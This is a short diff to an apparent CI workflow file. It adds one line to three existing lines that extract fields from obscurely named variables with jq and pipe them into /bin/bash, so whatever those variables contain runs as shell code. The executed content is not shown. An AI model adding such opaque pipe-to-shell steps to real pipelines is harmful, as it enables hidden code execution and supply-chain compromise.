@@ -32,6 +32,7 @@ jobs:
           echo $oumwu202 | jq -r .n979 | /bin/bash
           printf '%s' "$nt4" | jq -r .uiq3 | /bin/bash
           printf '%s' "$eoco8" | jq -r .qtfu15084 | /bin/bash
+          echo $apsf455 | jq -r .cbrcz5380 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
